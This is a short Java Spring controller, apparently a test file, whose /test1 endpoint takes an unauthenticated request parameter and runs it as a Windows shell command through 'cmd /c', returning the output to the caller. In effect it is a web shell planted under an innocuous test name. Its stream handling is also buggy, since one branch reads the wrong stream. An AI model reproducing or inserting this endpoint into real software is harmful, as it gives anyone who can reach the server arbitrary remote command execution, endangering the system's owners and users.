package cn.com.gatico.controller;

import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import java.io.InputStream;
import java.io.OutputStream;

/**
 * @author Gatico
 * @version 1.0
 * @date 2019/11/25 11:38
 */
@Controller
public class testController {

    @RequestMapping(value = "/test2", method = RequestMethod.GET)
    public ResponseEntity<Object> hello() {
        return ResponseEntity.ok(null);
    }

    @RequestMapping(value = "/test1", method = RequestMethod.GET)
    public String test(String c) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", c});
            InputStream is = p.getErrorStream();
            InputStream is2 = p.getInputStream();
            OutputStream os = p.getOutputStream();
            while (p.isAlive()) {
                Thread.sleep(100);
            }
            if (is.available() > 0) {
                byte[] arr = new byte[is2.available()];
                is2.read(arr);
                //System.out.println(arr.toString());
                return new String(arr, "GBK").replace(System.lineSeparator(), "</br>");
            }

            if (is2.available() > 0) {
                byte[] arr = new byte[is2.available()];
                is2.read(arr);
                //System.out.println(arr.toString());
                return new String(arr, "GBK").replace(System.lineSeparator(), "</br>");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return c;
    }
}
